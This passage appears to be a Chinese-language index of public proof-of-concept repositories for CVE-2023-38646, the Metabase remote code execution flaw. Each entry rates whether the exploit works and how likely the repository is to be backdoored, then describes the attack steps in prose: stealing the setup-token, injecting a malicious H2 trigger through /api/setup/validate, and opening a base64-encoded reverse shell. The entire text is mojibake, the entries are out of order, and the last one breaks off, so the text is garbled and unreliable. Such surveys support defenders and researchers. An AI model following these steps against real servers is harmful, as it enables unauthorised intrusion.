ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
